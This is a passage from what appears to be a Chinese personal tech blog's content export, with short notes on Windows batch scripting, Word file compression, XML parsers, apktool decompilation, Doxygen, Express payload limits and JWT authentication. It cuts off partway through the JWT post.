<p>格式：set 变量名=变量值<br>详细：被设定的变量以%变量名%引用</p>
<ul>
<li><p>取消变量<br>格式：set 变量名=<br>详细：取消后的变量若被引用%变量名%将为空</p>
</li>
<li><p>展示变量<br>格式：set 变量名<br>详细：展示以变量名开头的所有变量的值</p>
</li>
<li><p>列出所有可用的变量<br>格式：set</p>
</li>
</ul>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul>
<li>@ </li>
</ul>
<p>让执行窗口中不显示它后面这一行的命令本身。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 使用@将不显示后面的echo off命令</span><br><span class="line">@ echo off</span><br></pre></td></tr></table></figure>

<ul>
<li>echo</li>
</ul>
<p>echo即回显或反馈的意思。它由两种状态：打开和关闭。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 将不显示后续的命令</span><br><span class="line">@ echo off</span><br><span class="line">&#x2F;&#x2F; 将显示后续的命令</span><br><span class="line">@ echo on</span><br></pre></td></tr></table></figure>

<ul>
<li>::</li>
</ul>
<p>注释命令。在批处理文件中与rem命令等效</p>
<ul>
<li>call</li>
</ul>
<p>call命令用来从一个批处理文件调用另一个批处理文件。<strong>只有当被调用的批处理文件执行完成时，才返回。</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call pm2-startup install</span><br></pre></td></tr></table></figure>

<ul>
<li>start</li>
</ul>
<p>启动单独的“命令提示符”窗口来运行指定程序或命令。如果在没有参数的情况下使用，start 将打开第二个命令提示符窗口。</p>
<ul>
<li>pause</li>
</ul>
<p>暂停命令。方便用户查看信息，查看完毕后可继续执行。</p>
<ul>
<li>explorer</li>
</ul>
<p>在 cmd 下输入explorer可打开文件夹图形界面，例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 在图形界面中打开当前文件夹</span><br><span class="line">explorer .</span><br></pre></td></tr></table></figure>

<ul>
<li>%i</li>
</ul>
<p>for循环在cmd命令行中的固定用法for %i in (set) do (…)，循环变量格式为%i</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for %i in (1,2,3,5,8) do echo %i</span><br></pre></td></tr></table></figure>

<ul>
<li>%%i</li>
</ul>
<p>for循环在bat处理程序中的固定用法for %%i in (set) do (…)，循环变量格式为%%i</p>
<ul>
<li>&amp;  </li>
</ul>
<p>顺序执行多条命令，而不管命令是否执行成功</p>
<ul>
<li>&amp;&amp;</li>
</ul>
<p>顺序执行多条命令，当碰到执行出错的命令后将不执行后面的命令</p>
<ul>
<li>||</li>
</ul>
<p>顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令（即：只有前面命令执行错误时才执行后面命令）</p>
<ul>
<li>|  </li>
</ul>
<p>管道命令 前一个命令的执行结果输出到后一个命令 如：help|more</p>
<ul>
<li><blockquote>
</blockquote>
</li>
</ul>
<p>清除文件中原有的内容后再写入</p>
<ul>
<li><blockquote>
<blockquote>
</blockquote>
</blockquote>
</li>
</ul>
<p>追加内容到文件末尾，而不会清除原有的内容主要将本来显示在屏幕上的内容输出到指定文件中指定文件如果不存在，则自动生成该文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">certutil -hashfile user-history.db md5 &gt;&gt; hash.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>cd /d %~dp0</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;d 表示直接切换到对应分区</span><br><span class="line">%0代表批处理本身 d:\qq\a.bat</span><br><span class="line">~dp是变量扩充</span><br><span class="line">d既是扩充到分区号 d:</span><br><span class="line">p就是扩充到路径 \qq</span><br><span class="line">dp就是扩充到分区号路径 d:\qq</span><br></pre></td></tr></table></figure>


<h1 id="批处理脚本示例"><a href="#批处理脚本示例" class="headerlink" title="批处理脚本示例"></a>批处理脚本示例</h1><p>示例1：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">@echo off</span><br><span class="line">set PATH&#x3D;E:\Simulation\x64\Release\;%PATH%;</span><br><span class="line">E:</span><br><span class="line">cd E:\Simulation\x64\Release\</span><br><span class="line">cd BlueSimu</span><br><span class="line">start FlightSimServer.exe</span><br><span class="line">cd ..&#x2F;RedSimu</span><br><span class="line">start FlightSimServer.exe</span><br><span class="line">cd ..</span><br><span class="line">start Simulation.exe</span><br><span class="line">start Simulation.exe</span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<p>示例2：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:: 定义变量</span><br><span class="line">set dataset&#x3D;j:\tensorflow\dataset\LSOTB-TIR\Training Dataset</span><br><span class="line">set imagedir&#x3D;%dataset%\LSOTB-TIR_TrainingData\TrainingData\TIR_training_004\bird_001</span><br><span class="line">set xmldir&#x3D;%dataset%\LSOTB-TIR_TrainingData\Annotations\TIR_training_004\bird_001</span><br><span class="line">set labelpath&#x3D;j:\tensorflow\workspace\training_demo\annotations\label_map.pbtxt</span><br><span class="line">set outputdir&#x3D;j:\tensorflow\workspace\training_demo\annotations\infrared_train_bird_004_001</span><br><span class="line">set process_script&#x3D;j:\tensorflow\scripts\preprocessing\generate_pascal_tfrecord.py</span><br><span class="line"></span><br><span class="line">:: 调用tfrecord脚本程序, for循环，字符串截取，字符串拼接，路径空格处理 </span><br><span class="line">for &#x2F;L %%i in (1,1,7) do python %process_script% -i &quot;%imagedir:~0,-1%%%i&quot;  -x &quot;%xmldir:~0,-1%%%i&quot;  -l %labelpath% -o %outputdir:~0,-1%%%i.record</span><br><span class="line">:: for &#x2F;L %%i in (10,1,16) do python %process_script% -i &quot;%imagedir:~0,-2%%%i&quot;  -x &quot;%xmldir:~0,-2%%%i&quot;  -l %labelpath% -o %outputdir:~0,-2%%%i.record</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure>

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ol>
<li><a href="https://en.wikipedia.org/wiki/Batch_file" target="_blank" rel="noopener">Batch file</a>,by Wikipedia.</li>
<li><a href="https://www.cnblogs.com/s1ihome/archive/2009/01/15/batTutorial.html" target="_blank" rel="noopener">批处理最完整人性化教程(.bat文件语法)</a>, by s1ihome.</li>
<li><a href="https://www.cnblogs.com/qlqwjy/p/8445993.html" target="_blank" rel="noopener">批处理命令之Start的详细用法</a>,by QiaoZhi.</li>
<li><a href="https://www.cnblogs.com/lm002003/archive/2012/05/15/2502367.html" target="_blank" rel="noopener">windows批处理set命令</a>,by 鹤唳九天.</li>
<li><a href="https://blog.dangjiahe.com/2018/05/09/windows%E6%89%B9%E5%A4%84%E7%90%86%E2%80%94%E2%80%94%E5%8F%98%E9%87%8F%EF%BC%8C%E5%91%BD%E4%BB%A4%E6%8D%A2%E8%A1%8C/" target="_blank" rel="noopener">windows批处理——变量，命令换行</a>,by undefined.</li>
<li><a href="https://blog.csdn.net/weixin_44256803/article/details/106636505" target="_blank" rel="noopener">Batch批处理字符串操作、for循环学习记录</a>,by blingbling_110.</li>
<li><a href="https://blog.csdn.net/albertsh/article/details/102985590" target="_blank" rel="noopener">.bat批处理（八）：各种形式的变量%0、%i、%%i、var、%var%、!var!的含义和区别</a>,by AlbertS.</li>
<li><a href="https://blog.csdn.net/iloli/article/details/44339893" target="_blank" rel="noopener">Bat命令学习-批处理中的&amp;、&amp;&amp;、|、||、&gt;、&gt;&gt;符号</a>,by iloli.</li>
<li><a href="https://blog.csdn.net/ldq_sd/article/details/121262933" target="_blank" rel="noopener">Windows certutil.exe 命令 简单举例 计算MD5与SHA1/256</a>,by ldq_sd.</li>
<li><a href="https://blog.csdn.net/spw55381155/article/details/91413034" target="_blank" rel="noopener">cmd: cd /D %~dp0 的含义</a>,by Nemo_XP.</li>
<li><a href="https://www.cnblogs.com/05-hust/articles/11866653.html" target="_blank" rel="noopener">CMD获取当前目录的绝对路径 （当前盘符和路径：%~dp0）</a>,by 亟待!.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>bat</tag>
      </tags>
  </entry>
  <entry>
    <title>Word文档压缩方法</title>
    <url>/2021/03/30/Word%E6%96%87%E6%A1%A3%E5%8E%8B%E7%BC%A9%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>编写完一个大型Word文档之后，发现文档大小远远超过预期。那么如何压缩word文档，使其满足我们的要求呢？</p>
<p>首先要了解大型word文档”虚胖”的原因，然后我们才能针对性性的压缩。大型word文档”虚胖”的原因具体如下：</p>
<ol>
<li>文档中有大量图片</li>
<li>文档中有Visio图、公式</li>
<li>文档中有大量交叉引用</li>
<li>文档在编辑过程中保存了大量无关内容</li>
</ol>
<p>针对原因1，解决方案是保存文档时设置压缩图片的选项为电子邮件”96ppi”。<br>针对原因2和原因3，解决方案是全选word文档，使用快捷键“ctrl+shift+f9”，将会去除引用，将Visio图和公式转换成图片。<br>针对原因4，解决方案是将word文档内容全选，复制到新的word文档。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://jingyan.baidu.com/article/154b46317c68cd28ca8f412b.html" target="_blank" rel="noopener">word中VISIO图批量转为图片格式</a>,by baidu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
      </tags>
  </entry>
  <entry>
    <title>XML解析入门</title>
    <url>/2020/01/30/XML%E8%A7%A3%E6%9E%90%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>最近在研究编写飞行动力学模型，发现需要使用很多用于插值的数据，这些数据可以是一维向量、二维表格或三维数据。在代码中直接硬编码存储是不合适的，降低程序的灵活性。直接使用文本文档存储也不合适，这些插值数据明显具有结构化的特征。于是想到用XML来存储表示这些数据。下面总结介绍XML解析相关知识。</p>
<h1 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h1><p>可扩展标记语言（英语：Extensible Markup Language，简称：XML）是一种标记语言。标记指计算机所能理解的信息符号，通过此种标记，计算机之间可以处理包含各种信息的文章等。如何定义这些标记，既可以选择国际通用的标记语言，比如HTML，也可以使用像XML这样由相关人士自由决定的标记语言，这就是语言的可扩展性。XML是从标准通用标记语言（SGML）中简化修改出来的。它主要用到的有可扩展标记语言、可扩展样式语言（XSL）、XBRL和XPath等。</p>
<h1 id="XML结构"><a href="#XML结构" class="headerlink" title="XML结构"></a>XML结构</h1><p>XML定义结构、存储信息、传送信息。下例为小张发送给大元的便条，存储为XML。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">  &lt;小纸条&gt;</span><br><span class="line">    &lt;收件人&gt;大元&lt;&#x2F;收件人&gt;</span><br><span class="line">    &lt;發件人&gt;小張&lt;&#x2F;發件人&gt;</span><br><span class="line">    &lt;主題&gt;問候&lt;&#x2F;主題&gt;</span><br><span class="line">    &lt;具體內容&gt;早啊，飯吃了沒？ &lt;&#x2F;具體內容&gt;</span><br><span class="line">  &lt;&#x2F;小纸条&gt;</span><br></pre></td></tr></table></figure>

<p>每个XML文档都由XML序言开始，在前面的代码中的第一行就是XML序言，<?xml version="1.0"?>。这一行代码会告诉解析器或浏览器这个文件应该按照XML规则进行解析。</p>
<p>但是，根元素到底叫&lt;小纸条&gt;还是&lt;小便条&gt;，则是由文档类型定义（DTD）或XML纲要（XML Schema）定义的。如果DTD规定根元素必须叫&lt;小便条&gt;，那么若写作&lt;小纸条&gt;就不符合要求。这种不符合DTD或XML纲要的要求的XML文档，被称作不合法的XML，反之则是合法的XML。</p>
<p>XML文件的第二行并不一定要包含文档元素；如果有注释或者其他内容，文档元素可以迟些出现。</p>
<h1 id="XML解析器"><a href="#XML解析器" class="headerlink" title="XML解析器"></a>XML解析器</h1><p>C++类型XML解析器有：</p>
<ul>
<li>Boost.PropertyTree - A property tree parser/generator that can be used to parse XML/JSON/INI/Info files. [Boost]</li>
<li>Expat - An XML parser library written in C. [MIT]</li>
<li>Libxml2 - The XML C parser and toolkit of Gnome. [MIT]</li>
<li>libxml++ - An XML Parser for C++. [LGPL2]</li>
<li>Mini-XML - A small XML parsing library written in ANSI C. [LGPL2 with exceptions]</li>
<li>PugiXML - A light-weight, simple and fast XML parser for C++ with XPath support. [MIT]</li>
<li>RapidXml - An attempt to create the fastest XML parser possible, while retaining useability, portability and reasonable W3C compatibility. [Boost]</li>
<li>TinyXML - A simple, small, minimal, C++ XML parser that can be easily integrating into other programs. [zlib]</li>
<li>TinyXML2 - A simple, small, efficient, C++ XML parser that can be easily integrating into other programs. [zlib]</li>
<li>TinyXML++ - A completely new interface to TinyXML that uses MANY of the C++ strengths. Templates, exceptions, and much better error * handling. [MIT]</li>
<li>Xerces-C++ - A validating XML parser written in a portable subset of C++. [Apache2]</li>
</ul>
<p>推荐使用TinyXML2。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.zhihu.com/question/32046606" target="_blank" rel="noopener">C++解析xml有什么好用的轮子?</a>,by 知乎.</li>
<li><a href="https://github.com/fffaraz/awesome-cpp#xml" target="_blank" rel="noopener">awesome-cpp xml</a>,by fffaraz.</li>
<li><a href="https://blog.csdn.net/liangzhao_jay/article/details/8797224" target="_blank" rel="noopener">XML与C++对象的相互转化</a>,by Mr_John_Liang.</li>
<li><a href="https://www.cnblogs.com/sanmaospace/p/3139186.html" target="_blank" rel="noopener">JSON与XML的区别比较</a>,by SanMaoSpace.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>apktool反编译安卓apk程序的方法</title>
    <url>/2022/06/29/apktool%E5%8F%8D%E7%BC%96%E8%AF%91%E5%AE%89%E5%8D%93apk%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>反编译安卓apk的过程如下：</p>
<ul>
<li>使用apktool反编译apk。使用如下命令：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apktool d -s &lt;file.apk&gt; -o &lt;outdir&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用dex2jar工具，将dex文件转成jar文件。使用如下命令：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">d2j-dex2jar.bat &lt;classes.dex&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用jd-gui查看jar包源代码。</li>
<li>从res/layout目录查看视图界面布局</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/ruancoder/article/details/51924179" target="_blank" rel="noopener">使用apktool反编译apk文件</a>,by ruancoder.</li>
<li><a href="https://www.jianshu.com/p/9931a1e77066" target="_blank" rel="noopener">Android逆向基础：Smali语法</a>,by 李全栋.</li>
<li><a href="https://www.cnblogs.com/Bluze/p/3229347.html" target="_blank" rel="noopener">AXMLPrinter2.jar查看apk中的布局xml文件</a>,by Bluze.</li>
<li><a href="https://blog.csdn.net/bupt073114/article/details/42298337" target="_blank" rel="noopener">APK文件结构和安装过程</a>,by cptbtptpss.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
        <tag>Java</tag>
        <tag>Andriod</tag>
      </tags>
  </entry>
  <entry>
    <title>depends使用帮助</title>
    <url>/2022/06/30/depends%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>Depends.exe 是用来反编译VC程序的工具，可以查看PE模块的导入模块以及导入和导出的函数，以及动态剖析PE模块的依赖性和解析C++的函数名称</p>
<p>可分析dll和exe所依赖的dll，可以看到dll以及dll的函数，可以查看导入导出函数。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/Scythe666/article/details/47165533" target="_blank" rel="noopener">depends.exe 使用说明</a>,by This is bill.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Wireshark抓取微信小程序中的视频</title>
    <url>/2022/07/05/Wireshark%E6%8A%93%E5%8F%96%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E8%A7%86%E9%A2%91/</url>
    <content><![CDATA[<p>最终发现还是Fiddler抓取微信小程序中的视频比较靠谱。Fiddler截取HTTPS报文的原理请参考<a href="https://www.cnblogs.com/sucretan2010/p/11526467.html" target="_blank" rel="noopener">Fiddler抓包原理和使用详解 </a>。</p>
<p>Fiddler抓取微信小程序中视频不行了，请使用WeChatVideoDownloader。具体使用参考<a href="https://linux.do/t/topic/131200" target="_blank" rel="noopener">最新可用微信视频号免抓包下载方法，亲测简单易用！</a></p>
<p>WeChatVideoDownloader出问题了，请使用res-downloader。具体使用请参考<a href="https://jpsmile.com/res-downloader/" target="_blank" rel="noopener">res-downloader v2.3.0 资源下载器_支持下载视频号、抖音、快手、小红书、酷狗音乐、qq音乐等（Win&amp;Mac&amp;Linux）</a></p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/baidu_38290612/article/details/114522978" target="_blank" rel="noopener">用Wireshark下载微信小程序里的视频【图文教程】</a>,by 微风星雨.</li>
<li><a href="https://blog.csdn.net/tp7309/article/details/53057429" target="_blank" rel="noopener">Wireshark抓包微信Web详细分析HTTPS通信中TLS/SSL工作原理</a>,by 亦游.</li>
<li><a href="https://www.cnblogs.com/zyfd/p/9552451.html" target="_blank" rel="noopener">Wireshark对HTTPS数据的解密</a>,by tianshidan1998.</li>
<li><a href="https://blog.51cto.com/liuzhengwei521/2430427" target="_blank" rel="noopener">基于wireshark抓包解析TLS1.2的通讯过程</a>,by weilovepan520 .</li>
<li><a href="https://www.laoqingcai.com/tls1.2-premasterkey/" target="_blank" rel="noopener">TLS1.2 PreMasterSecret And MasterSecret</a>,by 老青菜.</li>
<li><a href="https://www.csdn.net/tags/MtTaMg0sNTk3MTM5LWJsb2cO0O0O.html" target="_blank" rel="noopener">fiddler抓取微信小程序失败解决方案</a>,by csdn.</li>
<li><a href="https://blog.csdn.net/zd123_/article/details/110630876" target="_blank" rel="noopener">Fiddler获取微信视频太好用了呀</a>,by 给自己上发条.</li>
<li><a href="https://www.cnblogs.com/sucretan2010/p/11526467.html" target="_blank" rel="noopener">Fiddler抓包原理和使用详解 </a>,by sucre_tan.</li>
<li><a href="https://github.com/lecepin/WeChatVideoDownloader/issues/66" target="_blank" rel="noopener">WeChatVideoDownloader下载微信视频号视频</a>,by LazzyFatty.</li>
<li><a href="https://linux.do/t/topic/131200" target="_blank" rel="noopener">最新可用微信视频号免抓包下载方法，亲测简单易用！</a>,by YubinDong.</li>
<li><a href="https://blog.csdn.net/qq_17328759/article/details/127802435" target="_blank" rel="noopener">关于 OPENSSL_Uplink(XX……XX,08): no OPENSSL_Applink 处理</a>,by Qredsun.</li>
<li><a href="https://jpsmile.com/res-downloader/" target="_blank" rel="noopener">res-downloader v2.3.0 资源下载器_支持下载视频号、抖音、快手、小红书、酷狗音乐、qq音乐等（Win&amp;Mac&amp;Linux）</a>,by jpsmile.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>常用工具</tag>
        <tag>计算机安全</tag>
      </tags>
  </entry>
  <entry>
    <title>doxygen编译安装与文档生成</title>
    <url>/2021/03/09/doxygen%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85%E4%B8%8E%E6%96%87%E6%A1%A3%E7%94%9F%E6%88%90/</url>
    <content><![CDATA[<p>Doxygen是一个适用于C++、C、Java、Objective-C、Python、IDL（CORBA和Microsoft flavors）、Fortran、VHDL、PHP、C#和D语言的文档生成器。它可以在大多数类Unix操作系统、macOS以及Microsoft Windows上运行。由于该文档是直接写在源代码中的，因此比较容易保持更新。Doxygen可以交叉引用和源代码，使文件的读者可以很容易地引用实际的源代码。</p>
<h1 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h1><h2 id="Windows平台"><a href="#Windows平台" class="headerlink" title="Windows平台"></a>Windows平台</h2><p>Windows平台编译安装doxygen请参考链接<a href="https://www.doxygen.nl/manual/install.html" target="_blank" rel="noopener">Compiling from source on Windows</a>。</p>
<h1 id="文档生成"><a href="#文档生成" class="headerlink" title="文档生成"></a>文档生成</h1><p>请参考<a href="https://zhuanlan.zhihu.com/p/100223113" target="_blank" rel="noopener">Doxygen快速入门</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.doxygen.nl/manual/install.html" target="_blank" rel="noopener">Compiling from source on Windows</a>,by doxygen.</li>
<li><a href="https://zh.wikipedia.org/wiki/Doxygen" target="_blank" rel="noopener">Doxygen</a>,by wikipedia.</li>
<li><a href="https://www.jianshu.com/p/bf5afbbe183b" target="_blank" rel="noopener">Doxygen文档生成工具教程</a>,by chend0316.</li>
<li><a href="https://zhuanlan.zhihu.com/p/100223113" target="_blank" rel="noopener">Doxygen快速入门</a>,by 路明.</li>
<li><a href="https://wiki.flightgear.org/User:Callahanp/Flightgear_and_Simgear_Code/Doxygen" target="_blank" rel="noopener">User:Callahanp/Flightgear and Simgear Code/Doxygen</a>,by flightgear wiki.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>expressjs的PayloadTooLargeError错误的解决办法</title>
    <url>/2021/07/08/expressjs%E7%9A%84PayloadTooLargeError%E9%94%99%E8%AF%AF%E7%9A%84%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/</url>
    <content><![CDATA[<p>本文介绍Nodejs的Expressjs服务器出现PayloadTooLargeError错误的解决办法。</p>
<h1 id="问题表现"><a href="#问题表现" class="headerlink" title="问题表现"></a>问题表现</h1><p>当使用HTTP Put方法携带大量数据时前端会触发超时错误。</p>
<h1 id="问题分析"><a href="#问题分析" class="headerlink" title="问题分析"></a>问题分析</h1><p>在app.js中建立并使用应用级别的中间件函数，用于捕捉PayloadTooLargeError错误。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.use(function (req, res, next) &#123;</span><br><span class="line">  console.log(req)</span><br><span class="line">  next()</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

<h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><p>nodejs 做为服务器，在传输内容或者上传文件时，系统默认大小为100kb，这时，我们需要修改系统限制。我们在app.js中调用接口和对应方法中，加入对应参数即可：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var bodyParser &#x3D; require(&#39;body-parser&#39;);</span><br><span class="line">app.use(bodyParser.json(&#123;</span><br><span class="line">  limit: &#39;50mb&#39; &#x2F;&#x2F;nodejs 做为服务器，在传输内容或者上传文件时，系统默认大小为100kb,改为50M</span><br><span class="line">&#125;));</span><br><span class="line">app.use(bodyParser.urlencoded(&#123;</span><br><span class="line">  limit: &#39;50mb&#39;, &#x2F;&#x2F;nodejs 做为服务器，在传输内容或者上传文件时，系统默认大小为100kb,改为50M</span><br><span class="line">  extended: true</span><br><span class="line">&#125;));</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://blog.csdn.net/qq_41646249/article/details/105768377" target="_blank" rel="noopener">nodejs 做为服务器：PayloadTooLargeError: request entity too large when trying to POST into SQL</a>, by IT博客技术分享. </li>
<li><a href="https://www.cnblogs.com/wbl001/p/12050751.html" target="_blank" rel="noopener">【记录】form-data与x-www-form-urlencoded的区别</a>,by -天道酬勤-.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>JavaScript</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>express-jwt使用帮助</title>
    <url>/2019/07/25/express-jwt%E4%BD%BF%E7%94%A8%E5%B8%AE%E5%8A%A9/</url>
    <content><![CDATA[<p>express-jwt是一个验证JsonWebTokens并设置req.user的connect/express中间件。此模块允许您使用Node.js应用程序中的JWT令牌验证HTTP请求。 JWT通常用于保护API端点，通常使用OpenID Connect发布。</p>
<h1 id="Json-web-token结构"><a href="#Json-web-token结构" class="headerlink" title="Json web token结构"></a>Json web token结构</h1><p>JWT 的三个部分依次如下：</p>
<ul>
<li>Header（头部）</li>
<li>Payload（负载）</li>
<li>Signature（签名）</li>
</ul>
<h2 id="Header"><a href="#Header" class="headerlink" title="Header"></a>Header</h2><p>Header 部分是一个 JSON 对象，描述 JWT 的元数据，通常是下面的样子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;alg&quot;: &quot;HS256&quot;,</span><br><span class="line">  &quot;typ&quot;: &quot;JWT&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码中，alg属性表示签名的算法（algorithm），默认是 HMAC SHA256（写成 HS256）；typ属性表示这个令牌（token）的类型（type），JWT 令牌统一写为JWT。最后，将上面的 JSON 对象使用 Base64URL 算法转成字符串。</p>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><p>Payload 部分也是一个 JSON 对象，用来存放实际需要传递的数据。JWT 规定了7个官方字段，供选用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iss (issuer)：签发人</span><br><span class="line">exp (expiration time)：过期时间</span><br><span class="line">sub (subject)：主题</span><br><span class="line">aud (audience)：受众</span><br><span class="line">nbf (Not Before)：生效时间</span><br><span class="line">iat (Issued At)：签发时间</span><br><span class="line">jti (JWT ID)：编号</span><br></pre></td></tr></table></figure>

<p>除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;,</span><br><span class="line">  &quot;admin&quot;: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意，JWT 默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。这个 JSON 对象也要使用 Base64URL 算法转成字符串。</p>
<h2 id="Signature"><a href="#Signature" class="headerlink" title="Signature"></a>Signature</h2><p>ignature 部分是对前两部分的签名，防止数据篡改。</p>
<p>首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是 HMAC SHA256），按照下面的公式产生签名。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">  base64UrlEncode(header) + &quot;.&quot; +</span><br><span class="line">  base64UrlEncode(payload),</span><br><span class="line">  secret)</span><br></pre></td></tr></table></figure>

<p>算出签名以后，把 Header、Payload、Signature 三个部分拼成一个字符串，每个部分之间用”点”（.）分隔，就可以返回给用户。</p>
<h1 id="基于JWT的身份验证流程"><a href="#基于JWT的身份验证流程" class="headerlink" title="基于JWT的身份验证流程"></a>基于JWT的身份验证流程</h1><p>使用基于 JWT 的身份验证方法，在服务端不需要存储用户的登录记录。大概的流程是这样的：</p>
<ol>
<li>客户端使用用户名跟密码请求登录</li>
<li>服务端收到请求，去验证用户名与密码</li>
<li>验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端</li>
<li>客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里</li>
<li>客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</li>
<li>服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据</li>
</ol>
<h1 id="jsonwebtoken的使用"><a href="#jsonwebtoken的使用" class="headerlink" title="jsonwebtoken的使用"></a>jsonwebtoken的使用</h1><p>jsonwebtoken是JSON Web Tokens在Nodejs平台的实现。它可以与express-jwt模块配合，在expressjs中实现基于JWT的身份验证。</p>
<h2 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install jsonwebtoken --save</span><br></pre></td></tr></table></figure>

<h2 id="使用帮助"><a href="#使用帮助" class="headerlink" title="使用帮助"></a>使用帮助</h2><p>在expressjs中主要使用该模块生成JSON Web Tokens。其接口定义为：</p>
<ul>
<li>jwt.sign(payload, secretOrPrivateKey, [options, callback])</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var token &#x3D; jwt.sign(&#123;</span><br><span class="line">    userId: users[0].id</span><br><span class="line">  &#125;,</span><br><span class="line">  appConfig.secretOrPrivateKey, &#123;</span><br><span class="line">    expiresIn: 60 * 60 * 6</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li>jwt.verify(token, secretOrPublicKey, [options, callback])</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; verify a token symmetric - synchronous</span><br><span class="line">var decoded &#x3D; jwt.verify(req.body.token.split(&#39; &#39;)[1], appConfig.secretOrPrivateKey);</span><br><span class="line">var user &#x3D; await models.User.findByPk(decoded.userId);</span><br></pre></td></tr></table></figure>

<ul>
<li>jwt.decode(token [, options])</li>
</ul>
